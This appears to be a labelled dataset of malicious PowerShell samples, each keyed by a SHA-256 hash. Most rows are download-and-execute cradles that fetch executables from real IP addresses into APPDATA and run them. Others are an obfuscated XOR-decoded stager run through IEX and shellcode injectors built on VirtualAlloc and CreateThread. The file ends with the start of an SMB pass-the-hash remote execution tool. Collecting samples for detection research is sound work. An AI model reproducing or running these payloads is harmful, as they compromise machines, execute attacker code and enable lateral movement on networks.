(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c3c6d50a16390070f50d1204b1cd38139bdf78f551da9b27c45617e370e679ca,"
$wc=NEw-Object SYSteM.NEt.WeBClIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaders.AdD('User-Agent',$u);$Wc.PROXY = [SYsTem.Net.WEbREQUEsT]::DefAulTWebPrOXy;$Wc.Proxy.CREdenTiAls = [SYSTeM.NEt.CreDentIAlCAcHe]::DeFauLTNEtworKCrEdENTiaLs;$K='tJ2esVpq;/yZ7CmW&3P,HiOU?l<~b6If';$i=0;[chAr[]]$b=([chAr[]]($Wc.DOwNlOaDStriNG(""https://46.101.203.156:443/index.asp"")))|%{$_-BXoR$k[$I++%$k.LENgth]};IEX ($B-JOIn'')

",Payload
85ddac0c50f7a8449246521989fd5c5fded65123cb890a43d77094452f7d11db,"
(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
f3b502db5d75ca9ac406502147358eff2ef252794ddfe267e083c9a40f3c43c6,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x02,0xaa,0xcb,0x3c,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x51,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0x0d,0x48,0x3e,0xc0,0xf9,0x0e,0xc1,0x39,0xf9,0x6e,0x4b,0xdc,0xc8,0xae,0x2f,0x94,0x7a,0x1f,0x3b,0xf8,0x76,0xd4,0x69,0xe9,0x0d,0x98,0xa5,0x1e,0xa6,0x17,0x90,0x11,0x37,0x0b,0xe0,0x30,0xbb,0x56,0x35,0x93,0x82,0x98,0x48,0xd2,0xc3,0xc5,0xa1,0x86,0x9c,0x82,0x14,0x37,0xa9,0xdf,0xa4,0xbc,0xe1,0xce,0xac,0x21,0xb1,0xf1,0x9d,0xf7,0xca,0xab,0x3d,0xf9,0x1f,0xc0,0x77,0xe1,0x7c,0xed,0xce,0x9a,0xb6,0x99,0xd0,0x4a,0x87,0x62,0x7e,0xb3,0x28,0x91,0x7e,0xf3,0x8e,0x4a,0xf5,0x0d,0xed,0xf7,0x0e,0xca,0x8c,0x23,0x9a,0xc9,0x36,0xa7,0x3c,0x36,0xc7,0x64,0xda,0xbd,0xcb,0xc1,0xa8,0x9a,0xcf,0xd4,0x7d,0x91,0xeb,0x5d,0x80,0x76,0x7a,0x25,0xa7,0x52,0x27,0xfd,0xc6,0xc3,0x8d,0x50,0xf6,0x14,0x6e,0x0c,0x52,0x5e,0x82,0x59,0xef,0x3d,0xca,0xf3,0x95,0xc9,0x0a,0x64,0x21,0x5b,0x64,0x1d,0x99,0xf3,0x34,0xaa,0x07,0x03,0x3b,0x81,0x79,0xd0,0x90,0x79,0x29,0xb5,0x45,0x16,0xf7,0x6f,0x10,0x41,0xf8,0x45,0xb1,0xde,0x6d,0x65,0x66,0xb2,0x1b,0x39,0x60,0x4c,0xdc,0xb9,0x70,0x82,0xba,0x80,0x37,0x98,0x70,0xf3,0xe7,0x48,0x22,0x7a,0x98,0x4f,0x33,0xa9,0x2f,0x89,0x9f,0x3a,0x2f,0x14,0x40,0x3f,0x7c,0x4b,0xd3,0x68,0xd1,0x3d,0xbb,0x7d,0x80,0xef,0x00,0x7d,0xff,0x66,0x1c,0x8b,0xa0,0xd5,0xb2,0xd8,0x0d,0x8c,0x5c,0xf2,0xb7,0x28,0xe6,0xf3,0x62,0xcd,0xd8,0x79,0x86,0x81,0xad,0x6c,0xfe,0xed,0xfb,0xcd,0xa8,0xf2,0xd1,0x78,0x14,0x65,0xda,0x6c,0x94,0x75,0xb2,0x8c,0x94,0x35,0x42,0xde,0xfc,0xed,0xe6,0xb3,0x19,0xf2,0x32,0xa0,0xb2,0x5e,0x34,0x20,0x63,0x09,0x46,0x8f,0x8b,0xc9,0x15,0x99,0xe3,0xdb,0x0f,0xac,0x11,0x24,0xfa,0x2a,0x15,0xaf,0xc8,0xbe,0x92,0x51,0x10,0x45,0x5c,0x24,0x73,0x1e,0x9f,0x98,0x93,0x16,0xe0,0xd8,0x9b,0x18,0x27,0x15,0x4a,0x6a,0x61,0x61,0xbc,0xbc,0xa3,0xa0,0xf3,0xbc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5737aaa228604f4c9ffa52834b18dc897f313359f8b703b0d02ffa5a7b650697,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x4b,0x33,0x12,0xf0,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0x44,0xd1,0xe7,0x0c,0xb2,0x97,0x08,0xed,0x42,0xf8,0x81,0x08,0x73,0x38,0xf5,0x59,0x23,0x88,0x7d,0x0f,0xcf,0x63,0xd3,0xa4,0x44,0x01,0xfc,0xcb,0xed,0xac,0xda,0xe2,0xee,0x9d,0x1f,0x64,0x6c,0xdc,0x73,0x46,0x4d,0x2f,0x86,0x87,0x8a,0x52,0x6b,0xd5,0x43,0x18,0xde,0xca,0xe0,0x54,0xe3,0x61,0xba,0x79,0x63,0x95,0x0a,0x7b,0x42,0x08,0x01,0x22,0x44,0xaa,0xc6,0x5e,0xcd,0xb4,0x0b,0x5a,0x87,0x4f,0xff,0x10,0x16,0x86,0xce,0xd9,0xb5,0xe7,0xff,0x2b,0xc7,0x20,0xc7,0xd3,0xb2,0x58,0x34,0x69,0xc5,0x9e,0x47,0xb5,0x40,0x05,0xef,0x3e,0xf2,0xe1,0x0e,0x92,0x65,0x61,0x1c,0x5f,0xe1,0x2d,0x00,0x5e,0x26,0x46,0x3c,0xeb,0xc9,0x89,0xb5,0xaf,0xed,0x0d,0x9e,0x74,0x8f,0x14,0x7a,0xda,0xb0,0x47,0x25,0x83,0x14,0x03,0xcb,0xd0,0x24,0x4e,0x83,0x15,0x05,0x71,0x53,0x32,0x1e,0x02,0x61,0x9d,0xb4,0x8c,0xc9,0x56,0x13,0x4a,0x2e,0x4d,0xe3,0xc4,0xd1,0x6e,0x14,0xcc,0x15,0x3a,0x44,0x66,0xbc,0x43,0x0f,0x76,0x41,0x96,0x80,0x26,0xed,0x49,0x61,0x97,0x4d,0x3a,0x09,0xfd,0x42,0x65,0x29,0xfe,0x89,0x0e,0xc0,0x04,0x59,0x62,0xe9,0x8b,0xef,0xec,0x13,0x94,0x1e,0xb1,0x9a,0x72,0x4a,0x59,0xcb,0x2d,0xe2,0xc0,0x56,0xa5,0x93,0x0d,0x4d,0xc3,0x93,0x86,0x62,0x33,0x5d,0x6f,0x0e,0x27,0x09,0x9f,0x45,0x15,0x9f,0xa0,0x73,0x30,0x1f,0x35,0x78,0x93,0x48,0xa1,0x82,0xc2,0xbe,0x6e,0x7c,0x21,0xb5,0xa7,0xe8,0x8a,0xa1,0xc7,0xfc,0x0a,0x31,0x9e,0x96,0x0a,0x59,0x46,0xc3,0x58,0x7c,0x89,0xde,0xcc,0x2d,0x1c,0xe1,0xa4,0x82,0xb7,0x89,0x4a,0xfd,0xf0,0x15,0xb4,0x28,0x01,0x69,0x63,0x14,0x77,0x83,0xb7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
424a0bedf165410fb9a9773766afed5f0ab48ce81e011dd49070ffe2b2339970,"function Invoke-SMBExec
{

[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet(""Y"",""N"")][String]$CommandCOMSPEC=""Y"",
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][Switch]$SMB1,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($Command)
{
    $SMB_execute = $true
}

if($SMB1)
{
    $SMB_version = 'SMB1'
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}



function Get-PacketNetBIOSSessionService()
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOSSessionService.Add(""NetBIOSSessionService_Message_Type"",[Byte[]](0x00))
    $packet_NetBIOSSessionService.Add(""NetBIOSSessionService_Length"",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOSSessionService
}



function Get-PacketSMBHeader()
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBHeader.Add(""SMBHeader_Protocol"",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMBHeader.Add(""SMBHeader_Command"",$packet_command)
    $packet_SMBHeader.Add(""SMBHeader_ErrorClass"",[Byte[]](0x00))
    $packet_SMBHeader.Add(""SMBHeader_Reserved"",[Byte[]](0x00))
    $packet_SMBHeader.Add(""SMBHeader_ErrorCode"",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add(""SMBHeader_Flags"",$packet_flags)
    $packet_SMBHeader.Add(""SMBHeader_Flags2"",$packet_flags2)
    $packet_SMBHeader.Add(""SMBHeader_ProcessIDHigh"",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add(""SMBHeader_Signature"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBHeader.Add(""SMBHeader_Reserved2"",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add(""SMBHeader_TreeID"",$packet_tree_ID)
    $packet_SMBHeader.Add(""SMBHeader_ProcessID"",$packet_process_ID)
    $packet_SMBHeader.Add(""SMBHeader_UserID"",$packet_user_ID)
    $packet_SMBHeader.Add(""SMBHeader_MultiplexID"",[Byte[]](0x00,0x00))

    return $packet_SMBHeader
}

function Get-PacketSMBNegotiateProtocolRequest()
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_WordCount"",[Byte[]](0x00))
    $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_ByteCount"",$packet_byte_count)
    $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat"",[Byte[]](0x02))
    $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name"",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2"",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2"",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3"",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add(""SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3"",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMBNegotiateProtocolRequest
}

function Get-PacketSMBSessionSetupAndXRequest()
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_byte_count = $packet_byte_count[0,1]
    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_WordCount"",[Byte[]](0x0c))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_MaxBuffer"",[Byte[]](0xff,0xff))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_MaxMpxCount"",[Byte[]](0x02,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_VCNumber"",[Byte[]](0x01,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_SessionKey"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_SecurityBlobLength"",$packet_byte_count)
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_Reserved2"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_Capabilities"",[Byte[]](0x44,0x00,0x00,0x80))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_ByteCount"",$packet_security_blob_length)
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_SecurityBlob"",$packet_security_blob)
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_NativeOS"",[Byte[]](0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add(""SMBSessionSetupAndXRequest_NativeLANManage"",[Byte[]](0x00,0x00))

    return $packet_SMBSessionSetupAndXRequest 
}

function Get-PacketSMBTreeConnectAndXRequest()
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_WordCount"",[Byte[]](0x04))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_Flags"",[Byte[]](0x00,0x00))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_PasswordLength"",[Byte[]](0x01,0x00))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_ByteCount"",$packet_path_length)
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_Password"",[Byte[]](0x00))
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_Tree"",$packet_path)
    $packet_SMBTreeConnectAndXRequest.Add(""SMBTreeConnectAndXRequest_Service"",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $packet_SMBTreeConnectAndXRequest
}

function Get-PacketSMBNTCreateAndXRequest()
{
    param([Byte[]]$packet_named_pipe)

    [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]
    [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
    $packet_file_name_length = $packet_file_name_length[0,1]

    $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_WordCount"",[Byte[]](0x18))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_Reserved2"",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_FileNameLen"",$packet_file_name_length)
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_CreateFlags"",[Byte[]](0x16,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_RootFID"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_AccessMask"",[Byte[]](0x00,0x00,0x00,0x02))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_AllocationSize"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_FileAttributes"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_ShareAccess"",[Byte[]](0x07,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_Disposition"",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_CreateOptions"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_Impersonation"",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_SecurityFlags"",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_ByteCount"",$packet_named_pipe_length)
    $packet_SMBNTCreateAndXRequest.Add(""SMBNTCreateAndXRequest_Filename"",$packet_named_pipe)

    return $packet_SMBNTCreateAndXRequest
}

function Get-PacketSMBReadAndXRequest()
{
    $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_WordCount"",[Byte[]](0x0a))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_FID"",[Byte[]](0x00,0x40))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_Offset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_MaxCountLow"",[Byte[]](0x58,0x02))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_MinCount"",[Byte[]](0x58,0x02))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_Unknown"",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_Remaining"",[Byte[]](0x00,0x00))
    $packet_SMBReadAndXRequest.Add(""SMBReadAndXRequest_ByteCount"",[Byte[]](0x00,0x00))

    return $packet_SMBReadAndXRequest
}

function Get-PacketSMBWriteAndXRequest()
{
    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
    $packet_write_length = $packet_write_length[0,1]

    $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_WordCount"",[Byte[]](0x0e))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_FID"",$packet_file_ID)
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_Offset"",[Byte[]](0xea,0x03,0x00,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_Reserved2"",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_WriteMode"",[Byte[]](0x08,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_Remaining"",$packet_write_length)
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_DataLengthHigh"",[Byte[]](0x00,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_DataLengthLow"",$packet_write_length)
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_DataOffset"",[Byte[]](0x3f,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_HighOffset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBWriteAndXRequest.Add(""SMBWriteAndXRequest_ByteCount"",$packet_write_length)

    return $packet_SMBWriteAndXRequest
}

function Get-PacketSMBCloseRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBCloseRequest.Add(""SMBCloseRequest_WordCount"",[Byte[]](0x03))
    $packet_SMBCloseRequest.Add(""SMBCloseRequest_FID"",$packet_file_ID)
    $packet_SMBCloseRequest.Add(""SMBCloseRequest_LastWrite"",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBCloseRequest.Add(""SMBCloseRequest_ByteCount"",[Byte[]](0x00,0x00))

    return $packet_SMBCloseRequest
}

function Get-PacketSMBTreeDisconnectRequest()
{
    $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBTreeDisconnectRequest.Add(""SMBTreeDisconnectRequest_WordCount"",[Byte[]](0x00))
    $packet_SMBTreeDisconnectRequest.Add(""SMBTreeDisconnectRequest_ByteCount"",[Byte[]](0x00,0x00))

    return $packet_SMBTreeDisconnectRequest
}

function Get-PacketSMBLogoffAndXRequest()
{
    $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBLogoffAndXRequest.Add(""SMBLogoffAndXRequest_WordCount"",[Byte[]](0x02))
    $packet_SMBLogoffAndXRequest.Add(""SMBLogoffAndXRequest_AndXCommand"",[Byte[]](0xff))
    $packet_SMBLogoffAndXRequest.Add(""SMBLogoffAndXRequest_Reserved"",[Byte[]](0x00))
    $packet_SMBLogoffAndXRequest.Add(""SMBLogoffAndXRequest_AndXOffset"",[Byte[]](0x00,0x00))
    $packet_SMBLogoffAndXRequest.Add(""SMBLogoffAndXRequest_ByteCount"",[Byte[]](0x00,0x00))

    return $packet_SMBLogoffAndXRequest
}



function Get-PacketSMB2Header()
{
    param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2Header.Add(""SMB2Header_ProtocolID"",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2Header.Add(""SMB2Header_StructureSize"",[Byte[]](0x40,0x00))
    $packet_SMB2Header.Add(""SMB2Header_CreditCharge"",[Byte[]](0x01,0x00))
    $packet_SMB2Header.Add(""SMB2Header_ChannelSequence"",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_Reserved"",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_Command"",$packet_command)
    $packet_SMB2Header.Add(""SMB2Header_CreditRequest"",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_Flags"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_NextCommand"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_MessageID"",$packet_message_ID)
    $packet_SMB2Header.Add(""SMB2Header_Reserved2"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add(""SMB2Header_TreeID"",$packet_tree_ID)
    $packet_SMB2Header.Add(""SMB2Header_SessionID"",$packet_session_ID)
    $packet_SMB2Header.Add(""SMB2Header_Signature"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2Header
}

